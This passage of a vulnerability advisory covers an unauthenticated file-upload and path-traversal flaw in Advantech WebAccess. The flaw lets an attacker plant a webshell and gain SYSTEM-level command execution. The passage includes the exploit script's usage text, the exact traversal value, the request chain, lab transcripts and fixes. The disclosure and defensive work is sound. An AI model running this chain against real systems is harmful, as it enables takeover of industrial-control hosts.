usage: advantech_webaccess_crystalrpt_unauth_file_upload_rce.py
       [-h] --target TARGET [--port PORT] [--scheme {http,https}]
       [--path PATH] [--upload-flag UPLOAD_FLAG] [--proj-name PROJ_NAME]
       [--node-name NODE_NAME] [--shell-name SHELL_NAME]
       [--shell-file SHELL_FILE] [--payload PAYLOAD] [--marker MARKER]
       [--user-agent USER_AGENT] [--timeout TIMEOUT] [--form-only]

Fetch the CrystalRpt.aspx upload form unauthenticated with a path-traversal
nodeName, save an ASP.NET page into the IIS application root, then request it
and check for an execution marker.

options:
  -h, --help            show this help message and exit
  --target TARGET       target host or IP
  --port PORT           target port (default 80)
  --scheme {http,https}
                        http or https
  --path PATH           path to CrystalRpt.aspx (default
                        /broadweb/WaCrpt/CrystalRpt.aspx)
  --upload-flag UPLOAD_FLAG
                        query flag that makes the page render the upload form
  --proj-name PROJ_NAME
                        projName form value, any non-empty string
  --node-name NODE_NAME
                        nodeName form value carrying the traversal, exactly
                        two .. levels
  --shell-name SHELL_NAME
                        leaf name written into the application root
  --shell-file SHELL_FILE
                        upload a local .aspx payload instead of the built-in
                        page
  --payload PAYLOAD     command executed through the uploaded page's c
                        parameter
  --marker MARKER       string that must appear in the response to confirm
                        execution
  --user-agent USER_AGENT
                        User-Agent header, mandatory for this page
  --timeout TIMEOUT     socket timeout in seconds
  --form-only           stop after fetching the form and harvesting the
                        ViewState pair
```

Implementation notes that matter to a reader reproducing or adapting it:

- The built-in payload is the 510-byte page reproduced in section 8, and the script measures it at exactly 510 bytes — the same figure observed on disk in the verification environment. `--shell-file` replaces it with an operator-supplied page without changing the chain.
- The requests-3-and-4 URL is derived by taking the directory component of `--path`, so `--path /broadweb/WaCrpt/CrystalRpt.aspx` yields `/broadweb/WaCrpt/shell.aspx`, and a deployment where the application sits at the site root yields `/shell.aspx`. No shell URL is hardcoded.
- `--target` is mandatory; there is no default host. `--node-name` defaults to the two-level form and should not be lengthened (section 6).
- A `User-Agent` header is attached to every one of the four requests, including the two `GET`s, so that the `ViewerGlobal.get_IsSafari()` failure mode cannot appear halfway through the chain.
- Status 500 on request 2 is reported as the expected outcome and does not abort the run; the run is judged on request 3 and request 4.

The client was exercised against a local stub responder reproducing the documented status sequence (200 for the form, 500 for the upload, 200 for the written page) before being pointed at any target. That self-test verifies the client's parsing, multipart encoding, URL derivation and exit codes; it says nothing about the product and is not evidence for the finding. Its output is an **abridged excerpt, not complete output**. Omitted from it here, in the order the client prints them, are: a title line and a `[*] target: <scheme>://<host>:<port><path>` line before step 1; a blank separator line; the `[+] whoami: <identity>` line that follows step 3's status line; step 4's own `[+] HTTP <status>` line; one `[+] <line>` line per line of step 4's command output; and, where the worker process does report an identity, a trailing `[+] execution identity reported by the worker process: <identity>` line. Nothing shown below was altered:

```text
[*] step 1  POST /broadweb/WaCrpt/CrystalRpt.aspx?upload=1
[+] HTTP 200, body 1453 bytes
[+] upload form rendered, __VIEWSTATE len=1056, __EVENTVALIDATION len=92
[*] step 2  POST upload shell.aspx (510 bytes)
[+] HTTP 500
[+] 500 is expected: SaveAs completes, then ReportDocument.Load throws on the non-.rpt file
[*] step 3  GET /broadweb/WaCrpt/shell.aspx?c=whoami
[+] HTTP 200
[*] step 4  GET /broadweb/WaCrpt/shell.aspx?c=echo WACRPT_RCE_CONFIRMED & whoami
[+] RESULT: RCE CONFIRMED, marker WACRPT_RCE_CONFIRMED present
```

The equivalent invocation against a verification target is shown below. **Attribution, stated here so that section 9 cannot be misread:** the transcript reproduced in section 9 is the output of the research-phase client whose stdout the research record preserves, and it is that record's text verbatim except for two edits declared inline there. `exploit/advantech_webaccess_crystalrpt_unauth_file_upload_rce.py` is a parameterised re-implementation of the same four-request chain — same traversal, same payload, same marker check — and it is **not** the tool that produced that transcript; its own output differs in wording from the research client's on essentially every line.

```text
python3 exploit/advantech_webaccess_crystalrpt_unauth_file_upload_rce.py \
    --target <lab-host> --port <lab-port> \
    --path /CrystalRpt.aspx \
    --marker RCE_CONFIRMED_BY_WACRPT_EXPLOIT \
    --payload "echo RCE_CONFIRMED_BY_WACRPT_EXPLOIT & hostname"
```

### Exploit variants not constructed

- **Non-`.aspx` payloads.** A `.config` leaf could alter the application's own configuration, and an `.asmx`/`.ashx` leaf would give a handler that does not require page compilation. Neither was constructed or tested; the `.aspx` page is the only payload the record verifies.
- **Alternative write destinations.** Because `Server.MapPath` refuses traversal above the application root, the chain cannot reach `broadweb\` or the filesystem at large through `nodeName`. Writing to a different *sub*directory of the WaCrpt application root would need an additional primitive and was not attempted.
- **File overwrite.** Not tested, not claimed.
- **Persistence and lateral movement.** The chain stops at command execution. Service installation, scheduled-task creation and movement to the SQL Server backend were out of scope.

## 9. Dynamic Verification

### Verification environment — what was built and what it was not

The verification target was **not a complete Advantech WebAccess installation**. The distributed 1.9 GB self-extracting installer could not be run to completion: it hung in Session 0 and never produced a stock, vendor-configured deployment. A full product installation was therefore never exercised, and nothing in this section should be read as a test of one.

What was built instead is a **deployment of the shipped `WaCrpt` application into a real IIS host** — the product's own files as documented in the research record, unmodified, in the product's own runtime, driven over real HTTP. That is materially stronger than an emulated image or a component harness that calls the sink directly, because the entire request path is genuine: IIS request handling, the ASP.NET Web Forms pipeline, Web Forms event dispatch into `fileSubmit_Click`, `Server.MapPath` normalisation, `FileUpload.SaveAs`, the ASP.NET build manager compiling a freshly written `.aspx`, and process creation inside `w3wp.exe`. It is materially weaker than a stock install in exactly one respect, which section 3 has already isolated: the IIS site configuration was authored in the lab rather than read from the installer.

```text
host          Windows Server lab VM (<lab-host>), reached from the same machine
target        IIS site "WaCrptSite", bound to 127.0.0.1:8899
              IIS anonymous authentication enabled (aligned with the requirement
              that the product's own login page be reachable anonymously)
application   <lab-dir>\WaCrpt\
                CrystalRpt.aspx            (2381 bytes, shipped)
                Web.config                 (shipped)
                bin\WaCrpt.dll             (shipped - contains the sink)
                bin\Newtonsoft.Json.dll    (shipped)
                bin\log4net.dll            (see note below)
app pool      "WaCrptPool": .NET v4.0, Classic pipeline,
              enable32BitAppOnWin64=true, identity LocalSystem
client        research-phase client, pure Python standard library, English
              stdout (LC_ALL=C). The parameterised re-implementation shipped as
              exploit/*.py did not produce the transcript below
interface     HTTP over loopback, 127.0.0.1:8899
```

Three deployment accommodations were necessary to make the shipped files load at all in this lab, and all three are recorded because they are modifications to the *hosting environment*, not to the vulnerable code:

- Seven CrystalDecisions assemblies were redirected from `13.0.2000.0` to `13.0.4000.0`, the versions actually present in the lab host's Windows v4 GAC.
- `log4net 1.2.10.0` (SAP public key token `692fbea5521e1304`), a dependency of `CrystalDecisions.Shared`, was copied from `C:\Windows\assembly\GAC_32\log4net\1.2.10.0__692fbea5521e1304\log4net.dll` into `bin\`, because .NET 4 does not probe the legacy `GAC_32` location.
- The application pool was configured as LocalSystem. This is the lab's choice and **not** an artifact-derived statement about the shipped default; see the identity analysis in section 10.

`bin\WaCrpt.dll`, `CrystalRpt.aspx` and `Web.config` were used without modification, as documented in the research record. The record does not log the step by which those files were obtained from the distribution, so this advisory asserts no byte-for-byte provenance chain; what it asserts is that nothing in them was altered for the test. No assembly was patched, no method body was rewritten, no authentication code was altered and no licensing or provisioning gate was bypassed. There was no such gate on this page.

### Verification evidence — research-phase client run

The complete client-side transcript of the **research-phase client** against the target above. This is the stdout that the research record preserves, reproduced verbatim except for two declared editorial changes: the explanation printed with the HTTP 500 spanned a single long line and has been wrapped here to publication width, and the lab host name that `hostname` returned in step 4 has been replaced by the placeholder `<lab-host>`. No other character is altered. The parameterised PoC shipped in `exploit/` re-implements this same chain but prints differently worded lines and did not produce this text:

```text
[*] Advantech WebAccess WaCrpt CrystalRpt.aspx unauth file-upload RCE
[*] Target: http://127.0.0.1:8899/CrystalRpt.aspx?upload=1

[*] Step 1: fetch upload form with path-traversal nodeName
    [+] HTTP 200, body 6051 bytes
    [+] upload form rendered (FileUpload1 present): True
    [+] __VIEWSTATE: len=1056
    [+] __EVENTVALIDATION: len=92

[*] Step 2: upload webshell shell.aspx
    [+] HTTP 500 (500 is expected: SaveAs succeeds, then CrystalDecisions
        ReportDocument.Load throws on the non-.rpt file)

[*] Step 3: trigger webshell GET /shell.aspx?c=whoami
    [+] HTTP 200
    [+] whoami output: nt authority\system

[*] Step 4: confirm arbitrary command execution
    [+] HTTP 200
    [+] output: RCE_CONFIRMED_BY_WACRPT_EXPLOIT
<lab-host>

[+] RESULT: RCE CONFIRMED as nt authority\system
```

Per-request detail:

| # | Method | URL | Status | Key response |
|---|---|---|---|---|
| 1 | POST | `/CrystalRpt.aspx?upload=1` with `projName=x`, `nodeName=\..\..\` | 200 | upload form rendered; `__VIEWSTATE` 1056 bytes, `__EVENTVALIDATION` 92 bytes, `FileUpload1` present; body 6051 bytes |
| 2 | POST | same URL, plus the harvested ViewState pair and `FileUpload1=shell.aspx` | 500 | expected — `SaveAs` completed, `ReportDocument.Load(shell.aspx)` threw; the shell is on disk |
| 3 | GET | `/shell.aspx?c=whoami` | 200 | `<pre>nt authority\system</pre>` |
| 4 | GET | `/shell.aspx?c=echo RCE_CONFIRMED_BY_WACRPT_EXPLOIT & hostname` | 200 | the literal marker `RCE_CONFIRMED_BY_WACRPT_EXPLOIT` followed by the target host name |

Step 4 is what separates "a page was written and returned a plausible string" from "arbitrary commands execute". The marker is an attacker-chosen literal echoed by `cmd.exe`, and `hostname` is a second, unrelated binary invoked in the same command line.

### Verification evidence — target-side confirmation

Client-side responses are not sufficient on their own for an upload chain, so the target filesystem was inspected as well:

```text
written file : <lab-dir>\WaCrpt\shell.aspx
size         : 510 bytes
content      : identical to the WEBSHELL constant transmitted in request 2
location     : the IIS application root of the WaCrpt application - served and
               script-executing, confirming that the two-level traversal resolved
               exactly there and not into report\x_\
timestamp    : matches the logged time of the step-2 POST
```

Server-side corroboration from the IIS W3C log for the site: two POSTs to `/CrystalRpt.aspx` returning 200 and then 500, immediately followed by a GET for the uploaded file returning 200. That sequence is the log-level fingerprint of the red herring described in section 5 — the 500 is logged, and so is the successful execution one second later.

Execution identity, from `whoami /groups` captured into a marker file on the target:

```text
<lab-dir>\wacrpt_rce_marker.txt
--------------------------------
WACRPT_RCE_CONFIRMED
nt authority\system
<whoami /groups output, including:>
  Mandatory Label\System Mandatory Level   (S-1-16-16384)   <- SYSTEM integrity level
  BUILTIN\Administrators                   (S-1-5-32-544)   <- administrators group
  IIS APPPOOL\WaCrptPool                   (S-1-5-82-...)   <- application pool identity
```

### Verification evidence — independent second run

The chain was then re-derived from the decompiled sources a second time, by a separate analysis pass that wrote its own minimal client rather than reusing the first pass's client, and executed it against the same deployed application:

```text
step 1  POST projName=x, nodeName=\..\..\", browser-like User-Agent
        -> HTTP 200, ViewState + EventValidation harvested, upload form rendered
step 2  POST reanalyst_final.aspx (450 bytes, independently written page)
        -> HTTP 500 (expected: SaveAs completed, ReportDocument.Load threw)
step 3  GET /reanalyst_final.aspx?c=whoami
        -> HTTP 200, "nt authority\system"
step 4  GET /reanalyst_final.aspx?c=whoami /priv
        -> HTTP 200, SeTcbPrivilege, SeDebugPrivilege,
           SeImpersonatePrivilege, SeBackupPrivilege enabled
step 5  directory listing on the target
        -> reanalyst_final.aspx present, 450 bytes, in <lab-dir>\WaCrpt\
```

Two different client implementations, two different payloads of two different sizes (510 bytes and 450 bytes), two different leaf names, one result. The `whoami /priv` output is the strongest single identity artifact of the whole verification: those four privileges together are the full SYSTEM privilege set, and `SeTcbPrivilege` in particular is not granted to ordinary service accounts.

That pass is also where both traversal constraints in section 6 were discovered — the two-level bound and the mandatory `User-Agent` header — neither of which was known when the first chain was authored.

### Verification review — the adversarial falsification pass

An independent falsification review attacked the chain from seven angles, and the finding survived all seven at a confidence of 0.82 on the "not refuted" verdict:

| Angle | Question | Outcome |
|---|---|---|
| 1 | Is the unauthenticated reachability an artifact of the lab deployment rather than of the product? | **Not refuted — the claim survives.** No `<authorization>` deny in the shipped `Web.config`, no authentication module, no `global.asax`; the site must permit anonymous access for the product's own login page; `CrystalRpt.cs` sits on the module's no-authentication list while eight sibling files call `isSessionExist`. |
| 2 | Is the SYSTEM identity an artifact of the lab deployment? | **Partially confirmed.** The test pool was LocalSystem; the shipped installer binds `broadweb` to `DefaultAppPool` and `AppPoolAssign.exe` sets `IdentityType` at install time, which static analysis cannot resolve. RCE existence is unaffected: any pool identity that can write the application root and run the page yields code execution. |
| 3 | Does the path traversal really work? | **Not refuted.** `[IO.Path]::GetFullPath("...\WaCrpt\report\x_\..\..\")` resolves to `...\WaCrpt\`; `Directory.Exists` returns true even with no `report` directory present; `validateRequest` does not filter `..\`. |
| 4 | Does `fileSubmit_Click` actually fire? | **Not refuted.** IIS log shows the two POSTs (200 then 500) and the subsequent 200 for the uploaded file; the 510-byte shell's on-disk timestamp matches the logged POST; the 500 is the `ReportDocument.Load` throw that follows a successful `SaveAs`. |
| 5 | Does `CrystalRpt.aspx` really exist in the shipped product? | **Not refuted.** 2381 bytes, `CodeBehind="CrystalRpt.aspx.cs"`, `Inherits="WaCrpt.CrystalRpt"`, served from within an IIS application alongside `bin\WaCrpt.dll`. |
| 6 | Is there a hidden precondition — a configured report project, a provisioned directory, a prior state? | **Not refuted.** None. `nodeName=\..\..\` lands on the application root, which always exists. |
| 7 | Is this a duplicate of already-public work on this product? | **Not refuted, with a stated residual.** The public item is authenticated (PR:L) and was addressed in an earlier release; this finding is unauthenticated and present in 9.2.3. Without a patch diff, complete exclusion of overlap is impossible; the PR:N versus PR:L difference and the sibling-file evidence of an omission carry the independence argument. See section 10. |

A separate re-analysis pass, independently reading the same decompiled sources, returned CONFIRMED at 0.95, and enumerated the same four structural facts: `Page_Load` performs no credential validation; `fileSubmit_Click` performs no extension validation; `SaveAs` precedes `Load`; and `addTemplate.cs` checks for `.RPT` while `CrystalRpt.cs` does not.

### What was NOT exercised

Stated explicitly so no reader can infer more than was tested:

- **No stock, vendor-configured WebAccess Node 9.2.3 installation.** The installer hung in Session 0. Consequently the shipped site configuration, the shipped `DefaultAppPool` binding, and the shipped application pool identity were never observed at runtime.
- **No end-to-end request to the production URL shape.** The deployed application served `CrystalRpt.aspx` at the site root over port 8899, not at `/broadweb/WaCrpt/CrystalRpt.aspx` under a site root that also contains `broadweb`. The path prefix in this advisory is derived from the shipped `Response.Redirect("/broadweb/user/signinonly.asp")` literal present in the decompiled `Page_Load` and from the application's placement, not from a request executed against a stock install.
- **No interaction with the rest of the product.** The classic-ASP tier, `waconfig90`, `BWMobileService`, `WaExlViewer`, the COM helpers, the SQL Server SQLEXPRESS and Access `.mdb` backends, and the SCADA runtime itself were not run and not reached from the shell.
- **No network-path test.** All requests traversed loopback from the same Windows host. No intervening firewall, reverse proxy, WAF or TLS terminator was present, because a stock install would have supplied any of the first three.
- **No `GET`-only variant.** The PoC issues request 1 as a multipart POST, as the chain requires. Whether a plain GET to the page also renders the upload form was not tested.
- **No overwrite test, no non-`.aspx` payload, no persistence test.** Not constructed, not claimed.
- **No privilege-level enumeration under a non-LocalSystem pool.** The chain's validity under `ApplicationPoolIdentity` is argued in section 10, not demonstrated — it was never run against a restricted pool.

## 10. Reachability and Security Impact

### Reachability preconditions

| Precondition | Present on a default install? | Basis |
|---|---|---|
| HTTP reachability of the IIS site hosting `broadweb` | yes | the product is a web server; this is its only operator interface |
| `WaCrpt` deployed and served as an IIS application | yes | shipped in the distribution with its own `Web.config` and `bin\` |
| No application-level authorization on `CrystalRpt.aspx` | **yes — artifact-proven** | shipped `Web.config` has no `<authorization>` deny and no authentication module; no `global.asax`; `Page_Load` performs no credential check |
| IIS anonymous authentication enabled for the `WaCrpt` application path | **required, but not artifact-proven** | structurally necessary for the product's own login page to be usable; reproduced in the lab; no `applicationHost.config` excerpt from the installer exists in the record |
| A report project provisioned / `report\<proj>_<node>\` present | **no — precondition removed by the traversal** | `nodeName=\..\..\` normalises to the application root, which always exists |
| Credentials of any kind | no | the chain is unauthenticated end to end |
| Operator interaction / user session | no | UI:N — nothing on the server or in any browser is required |
| A race window or timing condition | no | all three requests are deterministic; the only runtime bounds (two `..` levels, a `User-Agent` header) are fixed and attacker-satisfiable |
| Write permission on the application root held by the pool identity | yes | the handler must write uploaded reports there, and `updateFileList()` maintains a listing there |
| ASP.NET compiles arbitrary `.aspx` in an application root | yes | default build-manager behaviour, which is what converts the write into execution |

The single soft spot is the fourth row, and it is not soft in the sense of "probably wrong" but in the sense of "proven by structure and reproduction rather than by an extracted configuration file". Everything else is artifact-backed or runtime-demonstrated. Where an administrator has explicitly disabled anonymous authentication on the `WaCrpt` application, or has placed an authenticating gateway in front of it, this vector is closed and the conditional reading in section 12 applies. Where anonymous authentication is on — as it must be at site level for the product to be usable at all — nothing between the TCP connection and `SaveAs` stops an anonymous caller.

### Impact analysis — execution identity

The verified identity is `nt authority\system`, established three ways in section 9: `whoami`, the `whoami /groups` group set (`S-1-16-16384` System Mandatory Level, `S-1-5-32-544` BUILTIN\Administrators, plus the `IIS APPPOOL\WaCrptPool` virtual account), and `whoami /priv` showing `SeTcbPrivilege`, `SeDebugPrivilege`, `SeImpersonatePrivilege` and `SeBackupPrivilege` enabled.

That identity belongs to the **verification application pool**, which the lab configured as LocalSystem. The shipped default was not established from an artifact, and this advisory does not assert it:

- The shipped installer (`UnattendIIS_amd64.exe`) binds the `broadweb` site to `DefaultAppPool`.
- The pool identity is then set at install time by `AppPoolAssign.exe`, which writes the pool's `IdentityType` property. The record states that the concrete value could not be determined from static strings in that binary.
- The product's architecture argues for a high-privilege pool: WebAccess must reach industrial hardware and must launch helpers such as `drawcom.exe`, and the research record's independent pass judged a SYSTEM-class pool consistent with that requirement and with the product's historical deployment model. That is an architectural argument, not an artifact, and it is labelled as such.

The scoring does not depend on resolving this. Command execution as *any* IIS pool identity is a full compromise of the product's web tier: the pool identity owns the application's own files, configuration and runtime state, can read and modify the report tree and the served web content, can reach the product's backends with the application's own connection context, and holds a foothold from which the remaining privilege distance is a local escalation problem rather than a remote one. Under LocalSystem the distance is zero. Under `ApplicationPoolIdentity` it is short and well-trodden. The C:H/I:H/A:H assessment is therefore made on the code-execution primitive itself, and section 12 repeats the point where it matters.

### Impact analysis — confidentiality, integrity, availability

- **Confidentiality: High.** A shell in the web tier reads the product's own configuration, including database connection material and the SCADA project tree it serves. Under the verified SYSTEM identity it additionally reads the entire filesystem, the local secret store and every other process's memory. WebAccess nodes routinely hold the point list, alarm configuration and historian data for the process they monitor.
- **Integrity: High.** The write primitive is generic — an attacker-named file with attacker-chosen content inside a served application directory — before any execution is considered. With execution, product binaries, configuration, the report tree and host state are all modifiable. Manipulating served HMI content, tag values or alarm thresholds is within reach of the same primitive, which is the reason this class of defect is treated as an operational-technology incident and not only as a web-application one.
- **Availability: High.** The web server, the SCADA runtime it fronts, and the host itself can be stopped or corrupted. On a monitoring node, loss of the host removes visibility from operators even where the controlled process continues to run.
- **Privilege position.** From the network, unauthenticated, to code execution in the product's own service process: the boundary between "anyone who can reach the web port" and "whoever the pool identity is" does not exist. No credential is required to cross it and no second factor stands behind it.
- **Persistence.** The written page sits in the application directory, served on the same port and URL namespace as legitimate product traffic, and recompiles automatically after an IIS restart because the ASP.NET build manager works from the file on disk. That the file survives a restart is a property of build-manager behaviour rather than something this research tested; it is stated as inference.
- **Detection.** The malicious upload is an ordinary permitted feature invocation. The distinguishing artifacts are the HTTP 500 on a report upload, a `nodeName` form field containing `..\..\`, and the appearance of a new `.aspx` file in the application root — none of which the product reports as anomalous. The record does not establish that form field values are logged, so no claim is made about request-level log visibility.

### Impact independence — relationship to previously published advisories

One previously published item touches the same weakness class on the same product, and the record examined it directly.

| Published item | Class and posture | Relationship to this finding |
|---|---|---|
| CVE-2025-14849 (with the corresponding CISA ICS advisory) | Unrestricted file upload (CWE-434), **CVSS 3.1 8.8**, `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — i.e. **PR:L, an authenticated caller**, affecting 9.2.1 with a fix in 9.2.2. The advisory does not name the affected endpoint. | **Different authentication posture, and present in a later release.** This finding requires no credentials (PR:N), and the unvalidated sink was confirmed by decompilation in **9.2.3** — after the release that fixed the public item. |
| The `aspvbobj.include` COM helper's `VBWinExec` entry point, CVE-2018-6911 | Command execution through a COM helper invoked from classic ASP, already fixed by the vendor | **Different component and different mechanism.** It is mentioned in this advisory only to close out the attack-surface enumeration in section 4; nothing in this chain touches that COM object. |

Two readings of the CVE-2025-14849 relationship are consistent with the evidence, and the record does not pretend to have settled between them:

- **The endpoints differ**: the public fix addressed some other upload path and `CrystalRpt.aspx` was never covered, making this an independent unauthenticated variant.
- **The fix was incomplete**: the same path was addressed for authenticated callers but the unauthenticated route into it was not closed, making this an incomplete-fix variant on the same code.

Either way the operational conclusion for a 9.2.3 deployment is identical and unfavourable. What distinguishes the two is available: the public item is priced at PR:L, and the decompiled `Page_Load` on 9.2.3 performs no authorization decision whatsoever. Without a binary diff between 9.2.2 and 9.2.3 the possibility of endpoint overlap cannot be excluded to certainty, and this advisory says so rather than claiming more novelty than the evidence carries. No prior public writeup was used as a basis for this work; the sink, the traversal bound, the two hosting preconditions and the dynamic confirmation were each established independently from the distributed binaries.

## 11. Fix Recommendations

### Fix priority one — validate the extension in `fileSubmit_Click`, using the check the module already has

The immediate code fix for the write sink. In `WaCrpt.CrystalRpt.fileSubmit_Click`, before `SaveAs`, enforce the same case-insensitive `.RPT` allowlist that `addTemplate.cs` already applies:

```csharp
string ext = System.IO.Path.GetExtension(FileUpload1.FileName);
if (string.Compare(ext.TrimStart('.'), "RPT", ignoreCase: true) != 0) return;
```

Better still, extract that check into one shared helper and call it from both upload points, so the two handlers cannot drift apart again. A vendor patch applied to `addTemplate.cs` alone, or to a future third upload handler alone, reproduces this exact omission. A denylist (blocking `.aspx`, `.asp`, `.config`) is not an acceptable substitute: the build-manager surface is wider than any static list, and allowlisting the one format the feature exists to accept is the only construction that fails closed.

### Fix priority two — validate before writing, not after

`SaveAs` precedes `ReportDocument.Load`, so a rejected file has already reached disk. Reorder the logic so nothing is persisted until it is known to be a report: stage the upload to a temporary file outside every application root, attempt the parse, and only on success move it into place under a server-generated name. Equivalently, parse the submitted stream's header for the Crystal Report structure before calling `SaveAs` at all. This single change removes the "HTTP 500 but the file is saved" outcome that makes the current chain silent from the client's perspective.

### Fix priority three — put a real authorization decision in `Page_Load`

Replace the parameter-emptiness test with an authentication gate equivalent to what the rest of the product already uses: the `[WaAuth]` filter applied to `waconfig90` controllers, or the `isSessionExist` check used by eight sibling files in this very module. Two details matter:

- `Response.Redirect` is not an access decision. Where an unauthorized caller must be turned away, the handler has to terminate the request (`return` after the redirect, or `Response.End()`), not fall through to the rest of `Page_Load` and to event dispatch.
- The gate must cover the postback path, not only the initial render. `fileSubmit_Click` is reachable on a request where `firstLoad` is false; a check placed only inside the `firstLoad` block leaves the upload handler exposed.

Belt and braces at the configuration level: add `<authorization><deny users="?" /></authorization>` to `WaCrpt`'s `Web.config`. That closes the anonymous route to the whole application even if some future page forgets the code-level gate, without affecting the classic-ASP login page, which lives in a different application.

### Fix priority four — confine the derived directory, do not just filter its inputs

The traversal exists because `nodeName` flows unvalidated into a string that is concatenated and then handed to `Server.MapPath`. Two complementary controls:

- **Character-set validation** on `projName` and `nodeName`: reject any value containing `\`, `/` or `..`. This alone defeats the demonstrated payload.
- **A containment test on the result**, which also defeats payloads no one has thought of yet. After computing `rptDirPath`, canonicalise it and require that it lie under the canonical report root:

```csharp
string root = Path.GetFullPath(Server.MapPath("~/report"));
string dest = Path.GetFullPath(rptDirPath);
if (!dest.StartsWith(root + Path.DirectorySeparatorChar,
                     StringComparison.OrdinalIgnoreCase)) return;
```

Note that `Server.MapPath` already refuses to resolve above the application root — that is why the exploit is bounded at two `..` levels. Bounding is not confinement: the application root is the most dangerous directory in the application, because it is served and script-executing. The check must be against the `report` subtree specifically.

### Fix priority five — stop writing uploads into a script-executing directory

Move report storage out of the web application root entirely: a directory outside every IIS application, or at minimum a subdirectory whose `Web.config` clears the handler mappings and denies script execution. Where uploaded content must remain addressable, serve it through a handler that reads bytes from storage rather than from a path inside an application root, and generate the stored name server-side (a random token plus a server-assigned extension) so the client controls neither the name nor the extension on disk. Any one of these defeats the weaponisation even with the sink unpatched.

### Fix priority six — run the application pool with least privilege

Independently of the upload defect, the pool identity determines what any web-tier code execution is worth. Configure the `broadweb`/`WaCrpt` pool as a dedicated least-privilege account, and remove write permission for that account on the application root and on the `bin\` directory. Verify the identity the installer actually assigned rather than assuming it: section 10 records that the shipped installer sets the pool's `IdentityType` at install time through `AppPoolAssign.exe`, that the concrete value could not be determined from static strings in that binary, and that this advisory therefore asserts no shipped pool identity — neither `nt authority\system` nor any other value. Where SCADA functionality genuinely requires elevated host access — launching `drawcom.exe`, reaching industrial hardware — isolate that capability behind a separate privileged service with a narrow interface, so that the web tier does not need elevated host authority in order for the product to work. This would not have prevented the upload, but on any deployment whose pool identity is high-privilege — as the verification pool's `nt authority\system` was — it would have converted that shell into a constrained one.

### Fix priority seven — operator mitigations available before a patch exists

- Disable anonymous authentication for the `WaCrpt` application in IIS, leaving it enabled where the login page needs it. This is the single highest-value configuration change available today, given that section 3 identifies IIS-level anonymous authentication as the one precondition not proven from a shipped artifact.
- Block `/broadweb/WaCrpt/*` at the perimeter, or restrict the WebAccess web port to the management VLAN. A SCADA web interface is rarely intended to be reachable from a business network, let alone the internet.
- Place file-integrity monitoring on the application root and alert on any new or modified `*.aspx`, `*.asmx`, `*.ashx` or `*.config` file under `broadweb\WaCrpt\`. Legitimate operation creates `.rpt` files there, not pages.
- Alert on any HTTP 500 from a `CrystalRpt.aspx` POST, and on `nodeName` values containing `..` where form logging is available. The 500 is the chain's most reliable server-side tell.
- Audit the application root for unexpected pages. The presence of any `.aspx` file not accounted for by the distribution should be treated as an incident.

## 12. CWE and CVSS

### CWE classification

**CWE-434 — Unrestricted Upload of File with Dangerous Type.** The primary defect. `fileSubmit_Click` accepts a file and writes it to a location where the web server will execute it, with no restriction on the file's type. The "dangerous type" is not exotic: it is the page format of the very application doing the writing.

**CWE-22 — Improper Limitation of a Pathname to a Restricted Directory.** The destination directory is composed from `nodeName` without confinement to the intended `report\<proj>_<node>\` subtree. This is the weakness that converts a constrained upload into an upload *into the application root*, and it is what makes the write location attacker-chosen rather than merely attacker-influenced.

**CWE-306 — Missing Authentication for Critical Function.** Mapped here in addition to the two classes named in the underlying research, and evidenced by artifact: `Page_Load` performs no credential validation on a function that writes files into a script-executing directory. Eight sibling files in the module do perform a session-existence check.

**CWE-73 — External Control of File Name or Path.** `filePath = rptDirPath + FileUpload1.FileName` — both halves externally controlled, one of them through a traversal, the other through an unrestricted leaf name.

**CWE-862 — Missing Authorization** applies as the specific form of CWE-306 on the postback path, where `fileSubmit_Click` runs without any authorization decision having been made about the caller.

**CWE-250 / CWE-269 — execution with unnecessary privileges.** Conditional. Applies to a deployment where the application pool is `nt authority\system`, as it was in verification. Where the shipped default is a constrained virtual account, this classification is weaker, though the write-to-application-root privilege remains: the pool identity must be able to write into a script-executing directory for the feature to function.

### CVSS derivation

**Primary — the reading published for this finding.**

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **9.8 Critical**

Metric-by-metric:

- **AV:N.** The chain is three HTTP requests against the product's own web port. No local access, no adjacent-network requirement, no physical presence.
- **AC:L.** No race, no timing window, no memory-corruption reliability question, no dependency on any configuration an attacker must discover or change. Every precondition is deterministic and attacker-satisfiable: both form fields are attacker-supplied, the traversal depth needed is a fixed constant (two `..` levels, established in section 6), the `User-Agent` requirement is a single header, and the ViewState values are handed to the attacker by the first response. The HTTP 500 on the upload is not a partial failure that must be retried or interpreted probabilistically — it is the expected outcome of a successful write. Nothing about the attack is beyond the attacker's control, which is the CVSS 3.1 definition of AC:L.
- **PR:N.** No privileges are required to reach `fileSubmit_Click`. Section 3 separates the artifact-proven part (no authorization anywhere in the application) from the inferred part (IIS anonymous authentication for the `WaCrpt` path, structurally required by the product's own login page and reproduced in verification). On the reading this advisory publishes, that inference holds. The configuration in which it does not is priced separately below.
- **UI:N.** No operator action, no victim interaction, no social-engineering step. Requests 1 through 3 are all issued by the attacker.
- **S:U.** The compromise executes inside the IIS worker process belonging to the vulnerable product's own web application, and impact is assessed within that authority. This is deliberate: even under the verified SYSTEM identity, the code executes as the pool identity *of the vulnerable component*, and the gain from "anonymous network client" to "the product's service account" crosses a privilege level, not a component's security scope. Impact on other hosts — the PLC-facing runtime, neighbouring nodes — is a post-exploitation consequence reachable from that foothold, which CVSS 3.1 does not treat as a scope change in the vulnerable component. S:C would compute to 10.0 on these same impact values and is explicitly **not** claimed.
- **C:H.** Full read of the product's configuration, project data and served content, and — under the verified identity — of the entire filesystem and local secret store.
- **I:H.** A generic file-write primitive into a served application directory, plus arbitrary command execution: product binaries, configuration, tag and alarm data and host state are all modifiable.
- **A:H.** The web tier, the SCADA runtime it serves and the host can be stopped or corrupted, removing operator visibility of the monitored process.

Arithmetic check under the CVSS 3.1 base metric algorithm, which applies the Roundup rule (ceil to the nearest tenth) and the 3.1 scope-changed impact formula:

```text
computed from the vector   AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
stated in the research record for this finding    = 9.8   -> consistent
```

ISS = 1 − ((1−0.56)(1−0.56)(1−0.56)) = 0.914816; Impact (S:U) = 6.42 × ISS = 5.873119; Exploitability = 8.22 × 0.85 × 0.77 × 0.85 × 0.85 = 3.887043; Base = min(Impact + Exploitability, 10) = 9.760161495, and CVSS 3.1 Roundup (ceiling to the nearest tenth) gives **9.8**. The figure carried by the research record for this finding is the figure its own vector computes, so no correction is required and none is proposed. This is stated explicitly because several previously published advisories in this repository carried recorded scores that did not compute for their recorded vectors; this one does.

